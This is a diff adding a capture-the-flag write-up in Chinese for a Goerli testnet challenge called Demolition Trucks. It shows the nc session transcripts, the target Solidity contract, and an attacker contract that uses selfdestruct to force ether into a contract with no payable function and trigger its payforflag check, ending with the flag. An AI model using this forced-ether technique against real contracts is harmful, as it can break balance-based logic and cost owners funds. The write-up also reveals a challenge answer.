@@ -325,3 +325,112 @@ Get the flag after isSolved event is emitted！
 
 ------
 
+### Demolition Trucks
+
+题目描述如下：
+
+> 卖flag辣，只要你给钱，我就给你flag
+>
+> nc 124.221.212.109 10003
+
+`nc`链接靶机，选择`1`选项创建账户，服务器会给我们一个`deployer account`和`token`。
+
+```bash
+┌──(tyd㉿kali-linux)-[~]
+└─$ nc 124.221.212.109 10003
+pay any balance for flag
+Get the flag after isSolved event is emitted！
+
+[1] - Create an account which will be used to deploy the challenge contract
+[2] - Deploy the challenge contract using your generated account
+[3] - Get your flag once you meet the requirement
+[4] - Show the contract source code
+[-] input your choice: 1
+[+] deployer account: 0x7E68F0cf6FbFb729054c17AaD396b8ce90Cd6179
+[+] token: v4.local.RJlH2Xg05Wq23DZeINtVx2Imit_lgbaysFcncBe3KjOLgG1IevqWsQ-b9gfuER88cyPom5dtnTjs5cEt8k7Oz03qq-I5we0Z2Yt7N2kfBEQ5vXOljV3QRsDGUT1edaErQau24xEsSZiw2_HkJBj9efc00OoDDqn2-QHy4kWdEOokgg
+[+] please transfer 0.001 test ether to the deployer account for next step
+```
+
+用`Metamask`向该地址转账`0.001 GoerliETH`。待交易完成后选择`2`选项，输入`token`部署合约，拿到`contract address`和`transaction hash`。
+
+```bash
+┌──(tyd㉿kali-linux)-[~]
+└─$ nc 124.221.212.109 10003
+pay any balance for flag
+Get the flag after isSolved event is emitted！
+
+[1] - Create an account which will be used to deploy the challenge contract
+[2] - Deploy the challenge contract using your generated account
+[3] - Get your flag once you meet the requirement
+[4] - Show the contract source code
+[-] input your choice: 2
+[-] input your token: v4.local.RJlH2Xg05Wq23DZeINtVx2Imit_lgbaysFcncBe3KjOLgG1IevqWsQ-b9gfuER88cyPom5dtnTjs5cEt8k7Oz03qq-I5we0Z2Yt7N2kfBEQ5vXOljV3QRsDGUT1edaErQau24xEsSZiw2_HkJBj9efc00OoDDqn2-QHy4kWdEOokgg
+[+] contract address: 0x6A85f96Bdae3CC81D53caC82Ff93EA9f252b7c9d
+[+] transaction hash: 0x875b69c3caca00f6369ddc310da72bb7a51eb0bd5bb40fca613f9892f4f9b5d2
+```
+
+选择`4`选项查看合约代码，当合约地址的`balance`大于`0`时就能触发`isSolved()`函数。直接向合约地址转账的时候会交易失败，是因为合约账户没有任何函数标识为`payable`，所以这个合约不能接受外部转账。
+
+```solidity
+pragma solidity ^0.4.23;
+
+contract Trucks {
+    constructor() public{
+    }
+
+    event isSolved();
+
+    function getBalance() public view returns (uint256){
+        return address(this).balance;  
+    }
+
+    function payforflag() public returns (bool){
+        address _to = 0x498d4BAddD959314591Dc14cb10790e8Df68b1b1;
+        require(address(this).balance>0);
+        emit isSolved();
+        _to.transfer(address(this).balance);
+
+    }
+}
+```
+
+由题目名字联想到一种强制转账方式，即通过合约自毁来强行向目标合约地址转账。由于是刚接触区块链的题，不知道为什么我添加`1 Wei`再部署以下合约代码一直失败，但是`0 Wei`能够部署成功。
+
+```solidity
+pragma solidity ^0.4.23;
+
+contract Demolition {
+    function kill() public payable {
+        selfdestruct(address(0x6A85f96Bdae3CC81D53caC82Ff93EA9f252b7c9d));
+    }
+}
+```
+
+所以我就想着先部署合约代码，再向自建合约地址转账（在[**Etherscan**](https://goerli.etherscan.io/tx/0x495b59e652ec9ed383477f25c63a25084bc397845ea03c9c85e7b08621a4cdd7)中可以找到本次交易），然后再调用`kill()`函数让自建合约自毁（在[**Etherscan**](https://goerli.etherscan.io/address/0x8bb8487a06e383015e9820d0d7cd75532044f774)中可以看到自建合约已经自毁啦），从而实现向目标合约地址强制转账（在[**Etherscan**](https://goerli.etherscan.io/address/0x6A85f96Bdae3CC81D53caC82Ff93EA9f252b7c9d)中可以看到目标合约账户已经收到了0**.**0001 Ether）。
+
+![](https://paper.tanyaodan.com/BUUCTF/DemolitionTrucks/1.png)
+
+向目标合约地址强制转账成功后，直接调用题目合约地址中的`payforflag`即可解决问题。
+
+![](https://paper.tanyaodan.com/BUUCTF/DemolitionTrucks/2.png)
+
+在[**Etherscan**](https://goerli.etherscan.io/tx/0xf45803485a696dcf3ae8a7b00009e802b09fbb0f8abb4d60a695e316f11874dd)中找到本次交易，可以看到本次交易触发了`isSolved`事件，复制`Transaction Hash`，`nc`链接靶机选择`3`选项，输入`token`和`tx hash`即可得到`flag{1t_1s_a_pl3asant_c00p3rati0n}`。
+
+```bash
+┌──(tyd㉿kali-linux)-[~]
+└─$ nc 124.221.212.109 10003
+pay any balance for flag
+Get the flag after isSolved event is emitted！
+
+[1] - Create an account which will be used to deploy the challenge contract
+[2] - Deploy the challenge contract using your generated account
+[3] - Get your flag once you meet the requirement
+[4] - Show the contract source code
+[-] input your choice: 3
+[-] input your token: v4.local.RJlH2Xg05Wq23DZeINtVx2Imit_lgbaysFcncBe3KjOLgG1IevqWsQ-b9gfuER88cyPom5dtnTjs5cEt8k7Oz03qq-I5we0Z2Yt7N2kfBEQ5vXOljV3QRsDGUT1edaErQau24xEsSZiw2_HkJBj9efc00OoDDqn2-QHy4kWdEOokgg
+[-] input tx hash that emitted isSolved event: 0xf45803485a696dcf3ae8a7b00009e802b09fbb0f8abb4d60a695e316f11874dd
+[+] flag: flag{1t_1s_a_pl3asant_c00p3rati0n}
+```
+
+------
+
